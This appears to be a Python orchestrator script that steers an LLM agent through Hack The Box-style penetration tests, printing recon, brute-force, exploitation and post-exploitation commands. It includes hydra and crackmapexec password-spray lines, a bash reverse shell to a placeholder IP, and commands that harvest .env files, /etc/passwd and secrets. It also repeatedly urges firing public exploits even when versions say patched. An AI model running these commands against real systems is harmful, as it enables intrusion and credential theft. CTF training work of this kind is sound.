#!/usr/bin/env python3
"""Orchestrator think engine — reads state, outputs next action.
Upgraded with lessons from 2Million (easy) and Snapped (hard, active) HTB boxes.

Fix B (active stuck-reasoning): when the model loops on the same phase/sub
or logs repeated errors, this script no longer just prints a static next
step. It detects the loop, prints the stuck-reasoning worksheet inline,
shows everything already tried in this sub-phase, surfaces state-aware
unblocker suggestions, and forces the model to commit 3 hypotheses
before the next command. Designed for weak open-source LLMs that have
decent recall but poor planning.
"""
import json, sys, os, re
from collections import Counter

state_file = sys.argv[1] if len(sys.argv) > 1 else 'state/orchestrator.json'

with open(state_file) as f:
    s = json.load(f)

target = s['target']
phase = s['phase']
sub = s['sub_phase']
attempt = s.get('attempt', 0)
report_dir = s.get('report_dir', f'reports/{target}')
phase_history = s.get('phase_history', []) or []
errors = s.get('errors', []) or []
rejected = s.get('rejected_transitions', []) or []

# ═══════════════════════════════════════════════════════════════
# STUCK DETECTION
# A loop is detected when EITHER:
#   - attempt counter >= 2 (orch-error.py / invariant guards bumped it), OR
#   - the last 3+ phase_history entries are all in the same (phase, sub), OR
#   - the last 2+ errors are in the same (phase, sub).
# ═══════════════════════════════════════════════════════════════

def _last_n_match(history, n, phase_, sub_):
    if len(history) < n:
        return False
    tail = history[-n:]
    return all(h.get('phase') == phase_ and h.get('sub') == sub_ for h in tail)


def _last_n_errors_match(errs, n, phase_, sub_):
    if len(errs) < n:
        return False
    tail = errs[-n:]
    return all(e.get('phase') == phase_ and e.get('sub') == sub_ for e in tail)


is_stuck = (
    attempt >= 2
    or _last_n_match(phase_history, 3, phase, sub)
    or _last_n_errors_match(errors, 2, phase, sub)
    or len(rejected) >= 1  # any invariant rejection counts
)


def _state_aware_unblockers(state):
    """Return a list of concrete suggestions based on what's already in state.
    Each suggestion is a (label, command) tuple. Quality > quantity — we list
    only what's actually applicable to the current state."""
    out = []
    creds = state.get('credentials') or []
    services = state.get('services') or {}
    web_paths = state.get('web_paths') or []
    ports_tcp = state.get('ports', {}).get('tcp', []) or []
    findings = ' '.join(state.get('findings') or []).lower()
    history_text = ' '.join((h.get('result') or '') for h in (state.get('phase_history') or [])).lower()
    target = state['target']

    # 1) Username harvesting — read from STRUCTURED entities (Fix #3),
    #    not free-text prose. Falls back to legacy parsing only if entities
    #    are absent (e.g. older state file from before Fix #3 shipped).
    entities = state.get('entities') or {}
    likely_users = list(entities.get('usernames') or [])
    if not likely_users:
        # Legacy fallback for older state files. Fixed (Fix #7, 2026-05-07):
        # the previous regex matched ANY word after "users:" / "with" / etc.,
        # so prose like "found, with, admin, marcus, elena" was extracted as
        # 5 "usernames". Now we (a) only match the LDAP/CSV-style patterns
        # that real recon output produces, and (b) blacklist common English
        # words and recon vocabulary that look like usernames but aren't.
        STOPWORDS = {
            'found', 'with', 'and', 'or', 'the', 'for', 'has', 'have', 'are',
            'is', 'was', 'were', 'this', 'that', 'these', 'those', 'from',
            'into', 'onto', 'than', 'then', 'team', 'page', 'site', 'name',
            'names', 'list', 'lists', 'admin', 'admins', 'user', 'users',
            'account', 'accounts', 'login', 'logins', 'member', 'members',
            'role', 'roles', 'group', 'groups', 'system', 'systems', 'host',
            'hosts', 'web', 'app', 'apps', 'api', 'apis', 'service', 'services',
            'port', 'ports', 'protocol', 'http', 'https', 'tcp', 'udp', 'ssh',
            'smb', 'ftp', 'ldap', 'kerberos', 'staff', 'public', 'private',
            'enabled', 'disabled', 'open', 'closed', 'active', 'inactive',
            'managing', 'director', 'cro', 'cto', 'cfo', 'ceo', 'head',
            'engineer', 'developer', 'manager', 'financial', 'systems',
            'operations', 'security', 'sales', 'marketing', 'finance',
            'product', 'design', 'support', 'consultant', 'analyst',
            'officer', 'lead', 'senior', 'junior', 'principal', 'staff',
            'team', 'group', 'unit', 'division',
        }
        # Pattern A: structured "username: foo" / "sAMAccountName: bar"
        # Pattern B: "users found: a, b, c" — only the part right after the
        #            colon, and only if every token is a single lowercase word.
        candidate_chunks = []
        for m in re.finditer(
            r'\b(?:username|sam[a-z]*name|userprincipalname|account ?name|login ?name)\s*[:=]\s*([a-z][a-z0-9._-]{1,30})',
            findings + ' ' + history_text):
            candidate_chunks.append(m.group(1))
        # First name extraction from team-page style mentions: "Marcus Thorne",
        # "Elena Rossi" → marcus, elena. Two consecutive capitalized words.
        for m in re.finditer(r'\b([A-Z][a-z]{2,15})\s+[A-Z][a-z]{2,15}\b',
                             ' '.join(state.get('findings') or []) + ' ' +
                             ' '.join((h.get('result') or '') for h in (state.get('phase_history') or []))):
            candidate_chunks.append(m.group(1).lower())
        for tok in candidate_chunks:
            tok = tok.strip().lower()
            if not tok or tok in STOPWORDS:
                continue
            if 2 <= len(tok) <= 20 and re.match(r'^[a-z][a-z0-9._-]*$', tok):
                likely_users.append(tok)
        likely_users = list(dict.fromkeys(likely_users))[:8]

    # Always cap displayed list — a 12-username spray is fine to *run* but
    # ugly to print. Show top 8, but write all of them to the spray file.
    likely_users = likely_users[:24]
    display_users = likely_users[:8]

    has_ssh = 22 in ports_tcp
    has_smb = 445 in ports_tcp or 139 in ports_tcp
    has_winrm = 5985 in ports_tcp or 5986 in ports_tcp
    has_ftp = 21 in ports_tcp
    has_web = any(p in ports_tcp for p in (80, 443, 8080, 8443))

    if likely_users and (has_ssh or has_smb or has_winrm or has_ftp):
        users_csv = ','.join(display_users) + ('…' if len(likely_users) > len(display_users) else '')
        out.append((
            f"Cred-spray with discovered usernames ({users_csv}) against open auth services",
            (
                f"printf '%s\\n' {' '.join(likely_users)} > /tmp/users.txt && "
                + (f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://{target} ; " if has_ssh else "")
                + (f"crackmapexec smb {target} -u /tmp/users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success ; " if has_smb else "")
                + (f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://{target} ; " if has_ftp else "")
            ).strip().rstrip(';').strip()
        ))

    # 1b) PUBLIC POC EXISTS but model bailed because of version mismatch
    #     (the silentium failure mode). If we have a CVE recorded AND the
    #     prose mentions "version" + "<" or "requires creds" or "doesn't
    #     match", suggest firing the payload anyway.
    cves = entities.get('cves') or []
    bailout_phrases = ('but target is', 'exact version', "doesn't apply",
                       'doesn\u2019t apply', 'not vulnerable', 'patched',
                       'version mismatch', 'is for ', 'is for v')
    bailed_on_version = any(p in history_text for p in bailout_phrases)
    if cves and bailed_on_version:
        cve_label = cves[0]
        out.append((
            f"FIRE THE PUBLIC POC ANYWAY ({cve_label}). Version strings lie. "
            "Patches get reverted. Forks reintroduce bugs. Cost of one extra "
            "HTTP request is zero; cost of skipping a working exploit is the engagement.",
            f"# 1) Find the PoC: searchsploit -m <id> ; or grep the exploit/CVE on github\n"
            f"        # 2) Strip the script's version-string check (delete the `if version != ...` lines)\n"
            f"        # 3) Run the payload portion against {target} and inspect the response body\n"
            f"        # 4) If it requires auth, also try it WITHOUT auth and with header tricks:\n"
            f"        #    -H 'X-Forwarded-For: 127.0.0.1', -H 'x-request-from: internal',\n"
            f"        #    case mutation on the path (/API/v1/...), URL-encoded slashes"
        ))

    # 1c) AUTH WALL HIT REPEATEDLY — push auth-bypass research, source-dive
    auth_wall_hits = sum(1 for p in ('unauthorized access', 'invalid or missing token',
                                     'auth required', '401', 'requires auth',
                                     'requires credentials', 'need creds')
                         if p in history_text)
    if has_web and auth_wall_hits >= 2:
        out.append((
            "Auth wall keeps blocking you. Stop trying credentials and "
            "INVESTIGATE the auth middleware itself (open-source apps almost "
            "always have a whitelist).",
            "# 1) If the app is open-source (Flowise/Gitea/Jenkins/etc.):\n"
            "        #    git clone <repo> && grep -RIn 'whitelist\\|skipAuth\\|publicPaths\\|isPublic'\n"
            "        # 2) Enumerate every API endpoint visible in the JS bundle:\n"
            f"        curl -s http://{target}/assets/index*.js | grep -oE '/api/v[0-9]+/[a-zA-Z0-9_/-]+' | sort -u\n"
            "        # 3) For each endpoint, test unauth GET, POST {}, OPTIONS\n"
            "        # 4) Try parser tricks: case mutation, double slashes,\n"
            "        #    URL-encoded slashes (%2f), trailing dot, /../ relative paths"
        ))

    # 2) IDOR hint — if any /data/N or /user/N etc. path seen, suggest enumerating IDs
    idor_paths = [p for p in web_paths if re.search(r'/\w+/\d+', p)]
    if not idor_paths:
        for h in state.get('phase_history') or []:
            r = (h.get('result') or '').lower()
            for m in re.finditer(r'(/[a-z0-9_-]+/\d+)', r):
                idor_paths.append(m.group(1))
    idor_paths = list(dict.fromkeys(idor_paths))[:3]
    if idor_paths:
        first = idor_paths[0]
        base = re.sub(r'/\d+$', '', first)
        out.append((
            f"IDOR enumeration on {base}/N (you have {first} but may not have probed other IDs)",
            f"for i in $(seq 1 50); do echo -n \"$i: \"; curl -s -o /dev/null -w '%{{http_code}} %{{size_download}}\\n' http://{target}{base}/$i; done | sort -k2"
        ))

    # 3) Hidden parameter discovery — if web exists and command-injection failed, suggest arjun
    web_endpoints_seen = [p for p in web_paths if not re.search(r'\.(?:js|css|png|jpg|gif|ico)$', p)]
    if has_web and ('command injection' in history_text or 'no injection' in history_text or 'param' in history_text):
        for ep in web_endpoints_seen[:2] or ['/']:
            out.append((
                f"Hidden parameter discovery on http://{target}{ep} (commands ran but injection point not found — there's probably a hidden param)",
                f"arjun -u 'http://{target}{ep}' -m GET,POST --stable"
            ))

    # 4) Cred reuse with known creds across all open auth services
    if creds:
        # Pick first plausible user/pass
        first_cred = next((c for c in creds if isinstance(c, dict) and c.get('user') and c.get('pass') and c.get('user') != 'app_secret'), None)
        if first_cred:
            u = first_cred['user']
            p = first_cred['pass']
            cmds = []
            if has_ssh:
                cmds.append(f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no {u}@{target} id")
            if has_smb:
                cmds.append(f"crackmapexec smb {target} -u '{u}' -p '{p}' --shares")
            if has_winrm:
                cmds.append(f"crackmapexec winrm {target} -u '{u}' -p '{p}'")
            if has_ftp:
                cmds.append(f"curl -u '{u}:{p}' ftp://{target}/ --list-only")
            if cmds:
                out.append((
                    f"Cred reuse for {u}:{p} across all open auth services (you may have skipped this)",
                    ' ; '.join(cmds)
                ))

    # 5) FTP reachable but anon-only failed — try with discovered users
    if has_ftp and 'anonymous' in (findings + history_text) and likely_users:
        out.append((
            "FTP login with discovered usernames + common passwords (anon failed but named users may exist)",
            f"hydra -L /tmp/users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -f ftp://{target}"
        ))

    # 6) Web app shows real system data but no injection — the data itself is leaking creds/info
    if has_web and any(kw in (findings + history_text) for kw in ('netstat', 'ifconfig', 'ip a', 'shows real', 'system data')):
        out.append((
            "The web app is leaking system data — mine it. Snapshot every endpoint output and grep for creds/paths/users",
            f"for ep in {' '.join(set(web_endpoints_seen + ['/']))}; do echo \"=== $ep ===\"; curl -s 'http://{target}'\"$ep\"; done | tee /tmp/web-dump.txt | grep -iE 'pass|user|key|token|home|uid='"
        ))

    # 7) UDP hint — if recon was TCP-only and we're stuck, push UDP/SNMP
    if not state.get('ports', {}).get('udp'):
        out.append((
            "UDP services were never enumerated. SNMP (161) and TFTP (69) often leak everything in CTFs.",
            f"sudo nmap -sU --top-ports 50 --min-rate 2000 {target}"
        ))

    return out


def _format_tried(state):
    """Return a deduplicated bullet list of what has already been tried in the
    current sub-phase, so the model doesn't repeat itself."""
    same_sub = [h for h in (state.get('phase_history') or [])
                if h.get('phase') == state['phase'] and h.get('sub') == state['sub_phase']]
    seen, lines = set(), []
    for h in same_sub:
        r = (h.get('result') or '').strip()
        if not r:
            continue
        # Collapse near-duplicates by their first 80 chars
        key = r[:80].lower()
        if key in seen:
            continue
        seen.add(key)
        lines.append(r[:200])
    return lines


def _print_stuck_worksheet(state):
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  🚧 STUCK — LOOP DETECTED. Don't repeat what failed.        ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print()
    print(f"  Phase: {state['phase']}/{state['sub_phase']}    attempt={state.get('attempt', 0)}")
    print(f"  Target: {state['target']}")
    print()

    # 1. What you already tried (from history) — do not repeat
    tried = _format_tried(state)
    if tried:
        print("  ⚠️  Already attempted in this sub-phase — DO NOT repeat:")
        for t in tried[-6:]:
            print(f"     • {t}")
        print()

    # 2. Last 2 errors verbatim
    errs = state.get('errors') or []
    if errs:
        print("  Recent errors:")
        for e in errs[-2:]:
            print(f"     ✖ {e.get('error', '')[:200]}")
        print()

    # 3. Invariant rejections (if any)
    if state.get('rejected_transitions'):
        print("  🚫 Invariant rejections recorded — you tried to advance without proof:")
        for r in state['rejected_transitions'][-2:]:
            print(f"     ✖ {r.get('reason', '')[:200]}")
        print()

    # 4. State-aware unblockers (the actually useful part)
    unblockers = _state_aware_unblockers(state)
    if unblockers:
        print("  🎯 STATE-AWARE UNBLOCKERS — try one of these (highest leverage first):")
        for i, (label, cmd) in enumerate(unblockers[:6], 1):
            print(f"     {i}. {label}")
            print(f"        $ {cmd}")
        print()

    # 5. Force a reasoning step
    print("  🧩 BEFORE the next command, fill in this 6-line worksheet in your reply:")
    print("     ACCESS:        (what access do I currently have? unauthenticated/web user/shell/root)")
    print("     CONTROL:       (what can I write/influence? files, params, configs)")
    print("     READ:          (what can I read? endpoints, files, env)")
    print("     PROBLEM CLASS: (cred / authz / RCE / privboundary / tooling / network)")
    print("     HYPOTHESES (3, each with its own test command):")
    print("       H1: ... → test:")
    print("       H2: ... → test:")
    print("       H3: ... → test:")
    print("     NEXT CMD:      (pick ONE — the highest-leverage hypothesis)")
    print()
    print("  📖 Full worksheet (longer): knowledge-base/checklists/stuck-reasoning.md")
    print("  📖 Tooling fallback:          knowledge-base/checklists/operator-fallbacks.md")
    print("  📖 Creative pivots library:   knowledge-base/creative-pivots.md")
    print("  📖 (HTB retired box?)         bash scripts/walkthrough-search.sh <name>")
    print("")
    print("  🚧 The next `report` MUST contain at least 3 hypothesis lines")
    print("     (H1:/H2:/H3:) or it will be REJECTED by the stuck-gate.")
    print()
    print("  After you pick a hypothesis, run its test, then:")
    print("     bash scripts/orchestrator.sh report \"H<n>: <result>\"")
    print("  If a hypothesis dies cleanly, that's progress — report it as failed and move on.")
    print()
    print("  —— (Below is the original next-action; treat it as a fallback only) ——")
    print()


if is_stuck:
    _print_stuck_worksheet(s)
    # Persist that we showed the worksheet so we don't spam it every call.
    # We don't reset attempt here — only a successful `report` does that.
    # Fall through and ALSO print the normal next-action below as fallback.

print("╔══════════════════════════════════════════════════════════════╗")
print("║  🧠 NEXT ACTION                                             ║")
print("╚══════════════════════════════════════════════════════════════╝")
print()

# ═══════════════════════════════════════════════════════════════
# RECON PHASE
# ═══════════════════════════════════════════════════════════════
if phase == 'recon':
    if sub == 'portscan':
        print(f"  📍 Phase: RECON → Port Scan")
        print(f"  🎯 Target: {target}")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sC -sV -O -A -p- --min-rate 3000 -oA {report_dir}/full-scan {target}")
        print()
        print("  THEN REPORT RESULTS:")
        print('    bash scripts/orchestrator.sh report "port 22 open SSH OpenSSH 8.9, port 80 open HTTP nginx redirect to hostname.htb"')
        print()
        print("  FORMAT: List each open port with service, version, and any redirect/hostname info")

    elif sub == 'udp_scan':
        print(f"  📍 Phase: RECON → UDP Scan")
        print()
        print("  RUN THIS COMMAND:")
        print(f"    nmap -sU --top-ports 50 --min-rate 2000 -oA {report_dir}/udp-scan {target}")
        print()
        print('  REPORT: "no udp services" OR "port 161 open SNMP, port 53 open DNS"')

    elif sub == 'hostname_check':
        print(f"  📍 Phase: RECON → Hostname Resolution")
        hostnames = s.get('hostnames', [])
        print(f"  Hostnames found: {', '.join(hostnames)}")
        print()
        print("  ADD TO /etc/hosts:")
        for h in hostnames:
            print(f"    echo '{target} {h}' | sudo tee -a /etc/hosts")
        print()
        print("  If no sudo, use Host header trick:")
        for h in hostnames:
            print(f"    curl -s -H 'Host: {h}' http://{target}/")
        print()
        print('  REPORT: "hostname added" OR "no sudo, using Host header"')

    # ─── NEW: VHOST/SUBDOMAIN ENUMERATION ─────────
    elif sub == 'vhost_enum':
        print(f"  📍 Phase: RECON → Virtual Host / Subdomain Enumeration")
        hostnames = s.get('hostnames', [])
        base_domain = hostnames[0] if hostnames else target
        print()
        print("  ⚠️  CRITICAL: Many boxes hide key services behind subdomains!")
        print()
        print("  STEP 1 — Find the default response size to filter:")
        print(f"    curl -s -o /dev/null -w '%{{http_code}} %{{size_download}}' -H 'Host: nonexistent.{base_domain}' http://{target}/")
        print()
        print("  STEP 2 — Fuzz vhosts (replace SIZE with the default response size):")
        print(f"    ffuf -u http://{target} -H 'Host: FUZZ.{base_domain}' \\")
        print(f"      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\")
        print(f"      -mc all -fc 302 -fs SIZE -t 50")
        print()
        print("  STEP 3 — Also try manual checks for common subdomains:")
        common_subs = ['admin', 'api', 'dev', 'staging', 'portal', 'dashboard', 'git', 'jenkins', 'monitor', 'grafana', 'internal', 'test', 'beta', 'app', 'mail', 'vpn']
        print(f"    for sub in {' '.join(common_subs)}; do")
        print(f"      RESP=$(curl -s -o /dev/null -w '%{{http_code}}|%{{size_download}}' -H \"Host: ${{sub}}.{base_domain}\" http://{target}/)")
        print(f'      echo "$sub → $RESP"')
        print(f"    done")
        print()
        print("  Add any found subdomains to /etc/hosts, then report ALL found subdomains")
        print('  REPORT: "found admin.domain.htb, api.domain.htb" OR "no subdomains found"')

    elif sub == 'service_enum':
        print(f"  📍 Phase: RECON → Service Enumeration")
        print()
        services = s.get('services', {})
        for port, info in services.items():
            svc = info.get('service', 'unknown')
            ver = info.get('version', '')
            print(f"  Port {port}: {svc} {ver}")
            if 'http' in svc.lower() or 'web' in svc.lower() or port in ['80', '443', '8080', '8443']:
                print(f"    → whatweb -a 3 http://{target}")
                print(f"    → curl -s http://{target} | head -50")
            elif 'smb' in svc.lower() or port in ['445', '139']:
                print(f"    → enum4linux -a {target}")
            elif 'ssh' in svc.lower():
                print(f"    → searchsploit {svc} {ver}")
            elif 'ftp' in svc.lower():
                print(f"    → ftp {target} (try anonymous)")
        print()
        print("  READ: knowledge-base/checklists/enumeration-checklist.md")
        print("  REPORT what you learned about each service")

# ═══════════════════════════════════════════════════════════════
# WEB ENUMERATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'web_enum':
    if sub == 'tech_detect':
        print(f"  📍 Phase: WEB ENUM → Technology Detection")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  FOR EACH HOSTNAME/SUBDOMAIN, run:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    curl -s -I http://{h}/")
            print(f"    curl -s http://{h}/ | head -100")
        print()
        print("  LOOK FOR:")
        print("    - CMS (WordPress, Joomla, Drupal, custom)")
        print("    - Management panels (Nginx UI, phpMyAdmin, Jenkins, etc.)")
        print("    - Login pages, registration, invite codes")
        print("    - API endpoints (/api, /api/v1)")
        print("    - JavaScript files (may contain hidden endpoints)")
        print("    - Comments in HTML source")
        print()
        print('  REPORT: "PHP app, login at /login, API at /api, nginx-ui management panel on admin.host"')

    elif sub == 'dir_bruteforce':
        print(f"  📍 Phase: WEB ENUM → Directory Bruteforce")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  RUN FOR EACH HOST:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    gobuster dir -u http://{h} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 --no-error")
        print()
        print("  REPORT all interesting paths found")

    # ─── NEW: SENSITIVE FILE CHECK ─────────────────
    elif sub == 'sensitive_files':
        print(f"  📍 Phase: WEB ENUM → Sensitive File & Backup Check")
        hostnames = s.get('hostnames', [target])
        all_hosts = list(set(hostnames + s.get('subdomains', [])))
        print()
        print("  ⚠️  CRITICAL: Backup files and config dumps are HIGH-VALUE targets!")
        print("  Many apps expose backups, .env, database dumps without authentication.")
        print()
        print("  CHECK EACH HOST for sensitive files:")
        for h in (all_hosts if all_hosts else [target]):
            print(f"    for f in .env .env.bak .git/HEAD robots.txt sitemap.xml \\")
            print(f"      api/backup api/settings api/config backup backup.zip \\")
            print(f"      api/v1 api/debug .well-known/security.txt config.json \\")
            print(f"      server-status server-info debug info phpinfo.php; do")
            print(f"      CODE=$(curl -s -o /dev/null -w '%{{http_code}}' http://{h}/$f)")
            print(f'      [ "$CODE" != "404" ] && echo "[$CODE] http://{h}/$f"')
            print(f"    done")
        print()
        print("  IF BACKUP FOUND: Download it! Check headers for encryption keys.")
        print("  IF .ENV FOUND: Read it — contains DB credentials, API keys, secrets.")
        print("  IF API FOUND: Enumerate all endpoints (GET /api, GET /api/v1)")
        print()
        print("  REPORT: List all non-404 responses with status codes")

    elif sub == 'api_enum':
        print(f"  📍 Phase: WEB ENUM → API Enumeration")
        api_paths = [p for p in s.get('web_paths', []) if 'api' in p.lower()]
        print(f"  Known API paths: {', '.join(api_paths) if api_paths else 'none yet'}")
        print()
        print("  RUN THESE:")
        for p in api_paths:
            print(f"    curl -s http://{target}{p} | python3 -m json.tool")
        print()
        print("  LOOK FOR:")
        print("    - Admin/user management endpoints")
        print("    - Settings update endpoints (check if they require auth!)")
        print("    - File upload/download/backup endpoints")
        print("    - Invite/register endpoints")
        print("    - Endpoints that accept user input → potential injection")
        print()
        print("  TRY WITHOUT AUTH — some endpoints may be unprotected!")
        print("  REPORT: List all endpoints, which require auth, and what they do")

    # ─── NEW: CVE RESEARCH ─────────────────────────
    elif sub == 'cve_research':
        print(f"  📍 Phase: WEB ENUM → CVE Research")
        services = s.get('services', {})
        findings = s.get('findings', [])
        print()
        print("  ⚠️  SEARCH FOR KNOWN VULNERABILITIES in every identified service!")
        print()
        print("  FOR EACH SERVICE VERSION:")
        for port, info in services.items():
            svc = info.get('service', '')
            ver = info.get('version', '')
            if ver:
                print(f"    searchsploit {svc} {ver}")
        print()
        print("  FOR WEB APPS (detected CMS/panel/framework):")
        # Extract app names from findings
        apps = [f for f in findings if any(kw in f.lower() for kw in ['nginx-ui', 'wordpress', 'jenkins', 'drupal', 'joomla', 'grafana', 'gitlab', 'panel', 'cms'])]
        if apps:
            for a in apps:
                print(f"    → Research CVEs for: {a}")
        print(f"    python3 skills/tavily-search-pro/lib/tavily_search.py search \"APP_NAME VERSION CVE exploit RCE\" -n 5")
        print()
        print("  CHECK EXPLOIT-DB:")
        print(f"    searchsploit --www APP_NAME")
        print()
        print("  CHECK GITHUB for PoC exploits:")
        print(f"    python3 skills/tavily-search-pro/lib/tavily_search.py search \"APP_NAME CVE POC github exploit\" -n 5")
        print()
        print("  ╔═══════════════════════════════════════════════════════════╗")
        print("  ║  🔑 GOLDEN RULE: VERSION STRINGS LIE                       ║")
        print("  ╚═══════════════════════════════════════════════════════════╝")
        print("  If a public PoC exists for the product on the box, RECORD THE CVE")
        print("  even when the version-string range disagrees. Fix releases get")
        print("  reverted, forks reintroduce bugs, version checks are often wrong.")
        print("  You will fire the payload anyway in the exploit phase.")
        print()
        print("  REPORT: List all CVEs found with severity and whether PoC exists")
        print("          (do NOT pre-judge applicability — record the CVE either way)")

    elif sub == 'vuln_scan':
        print(f"  📍 Phase: WEB ENUM → Automated Vulnerability Scanning")
        print()
        print("  RUN THESE:")
        print(f"    nikto -h http://{target}")
        print(f"    nuclei -u http://{target} -severity critical,high")
        print()
        print("  REPORT all vulnerabilities found")

# ═══════════════════════════════════════════════════════════════
# EXPLOITATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'exploit':
    if sub == 'plan':
        print(f"  📍 Phase: EXPLOIT → Plan Attack")
        print()
        # Surface STRUCTURED state first — weak models can't re-parse prose
        ents = s.get('entities') or {}
        if ents.get('tech') or ents.get('cves') or ents.get('usernames') or ents.get('emails'):
            print("  STRUCTURED STATE (use this directly, don't re-parse prose):")
            if ents.get('tech'):
                print(f"    🔧 Tech detected:    {', '.join(ents['tech'])}")
            if ents.get('cves'):
                print(f"    🆔 CVEs to try:      {', '.join(ents['cves'])}")
            if ents.get('usernames'):
                show = ents['usernames'][:10]
                tail = '…' if len(ents['usernames']) > 10 else ''
                print(f"    👤 Usernames found:  {', '.join(show)}{tail}")
            if ents.get('emails'):
                print(f"    ✉️  Emails found:     {', '.join(ents['emails'][:5])}")
            print()
        print("  FINDINGS SO FAR:")
        for f in s.get('findings', []):
            print(f"    📝 {f}")
        print()
        print("  DECIDE: Which vulnerability to exploit first?")
        print("  Priority order (easiest → hardest):")
        print("    1. Unauthenticated endpoints (backup download, info leak)")
        print("    2. Known CVE with public PoC — FIRE IT EVEN IF VERSION SAYS PATCHED")
        print("    3. Command injection → direct RCE")
        print("    4. SQL injection → database access → creds")
        print("    5. File upload → webshell")
        print("    6. Default/weak creds → admin panel → RCE")
        print("    7. Authentication bypass → admin access")
        print("    8. Brute force (LAST RESORT — slow and noisy)")
        print()
        # If we have CVEs in entities, surface the version-skepticism rule loudly
        if ents.get('cves'):
            print("  🔑 PUBLIC POC EXISTS (" + ', '.join(ents['cves']) + "):")
            print("     Run the payload BEFORE concluding 'patched/not applicable'.")
            print("     Strip any version-string check inside the PoC and just fire it.")
            print("     Inspect the raw response — a 200/500 with side effects beats")
            print("     a 404/501 every time.")
            print()
        print("  READ: knowledge-base/mitre-attack/techniques/web-exploitation.md")
        print('  REPORT: bash scripts/orchestrator.sh report "attacking via [method] in [endpoint]"')

    elif sub == 'execute':
        print(f"  📍 Phase: EXPLOIT → Execute Attack")
        attack_plan = s.get('attack_plan', 'Check findings for exploitable vulnerability')
        print(f"  PLAN: {attack_plan}")
        print()
        print("  SET UP LISTENER FIRST:")
        print("    nc -nlvp 4444")
        print()
        print("  REVERSE SHELL CHEATSHEET:")
        print("    Bash:   bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")
        print("    Python: python3 -c 'import socket,subprocess,os;...'")
        print("    More:   cat knowledge-base/checklists/reverse-shells.md")
        print()
        print("  Get YOUR IP: ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        print()
        print("  IF SHELL OBTAINED: bash scripts/orchestrator.sh report 'got shell as www-data'")
        print("  IF FAILED: bash scripts/orchestrator.sh error 'payload was filtered'")

    elif sub == 'stabilize':
        print(f"  📍 Phase: EXPLOIT → Stabilize Shell & Gather Info")
        print()
        print("  UPGRADE SHELL:")
        print("    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        print("    Ctrl+Z → stty raw -echo; fg → export TERM=xterm")
        print()
        print("  GATHER ALL INFO (run all of these):")
        print("    whoami && id && hostname")
        print("    cat /etc/os-release | head -3")
        print("    uname -a")
        print("    cat .env 2>/dev/null")
        print("    find / -name '.env' -readable 2>/dev/null | head -5")
        print("    cat /etc/passwd | grep sh$")
        print("    ls -la /home/")
        print("    env | grep -iE 'pass|key|secret|token'")
        print()
        print("  REPORT: Include ALL output (users, OS version, any passwords/secrets found)")

    # ─── NEW: WEB APP ADMIN EXPLOITATION ──────────
    elif sub == 'web_app_admin':
        print(f"  📍 Phase: EXPLOIT → Web App Admin Exploitation")
        print()
        print("  You have admin access to a web application. Enumerate what it can do:")
        print()
        print("  CHECK THESE CAPABILITIES:")
        print("    1. BACKUP/RESTORE — can you download/upload backups? (may contain secrets)")
        print("    2. CONFIG EDITING — can you modify server configs? (may lead to RCE)")
        print("    3. TERMINAL/SHELL — does the app have a web terminal feature?")
        print("    4. FILE UPLOAD — can you upload files? (webshell)")
        print("    5. COMMAND EXECUTION — settings like 'restart command', 'test command'?")
        print("    6. USER MANAGEMENT — can you create admin users?")
        print("    7. API TOKENS/SECRETS — visible in settings/config?")
        print("    8. DATABASE ACCESS — can you view/export database?")
        print()
        print("  KEY TECHNIQUE: Download backups → decrypt → extract passwords/hashes → crack")
        print("  KEY TECHNIQUE: Modify app config → inject command in restart/test/exec fields")
        print("  KEY TECHNIQUE: Restore tampered backup → change startup command for shell access")
        print()
        print("  REPORT: List all capabilities found and which are exploitable")

# ═══════════════════════════════════════════════════════════════
# POST-EXPLOITATION PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'postex':
    if sub == 'user_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get User Flag")
        print()
        print("  CHECK FOR FLAGS:")
        print("    find /home -name 'user.txt' 2>/dev/null")
        print("    cat /home/*/user.txt 2>/dev/null")
        print()
        creds = s.get('credentials', [])
        if creds:
            print("  CREDENTIALS FOUND — try SSH/su:")
            for c in creds:
                if isinstance(c, dict):
                    print(f"    ssh {c.get('user','')}@{target}  # password: {c.get('pass','')}")
                    print(f"    su {c.get('user','')}")
                else:
                    print(f"    {c}")
        print()
        print("  REPORT: the flag hash and how you got it")

    # ─── NEW: CREDENTIAL REUSE CHECK ──────────────
    elif sub == 'cred_reuse':
        print(f"  📍 Phase: POST-EXPLOITATION → Credential Reuse Check")
        creds = s.get('credentials', [])
        print()
        print("  ⚠️  ALWAYS check if discovered passwords work on OTHER services/users!")
        print()
        if creds:
            print("  CREDENTIALS TO TRY:")
            for c in creds:
                if isinstance(c, dict):
                    print(f"    🔑 {c.get('user','')}:{c.get('pass','')} (source: {c.get('source','')})")
                else:
                    print(f"    🔑 {c}")
        print()
        print("  GET ALL USERS:")
        print("    cat /etc/passwd | grep sh$ | cut -d: -f1")
        print()
        print("  TRY EACH PASSWORD ON EACH USER:")
        print(f"    ssh USER@{target}")
        print("    su - USER")
        print()
        print("  TRY ON ALL SERVICES:")
        print(f"    crackmapexec ssh {target} -u USERS_FILE -p PASSWORDS_FILE")
        print()
        print("  IF YOU FOUND HASHES: Crack them first!")
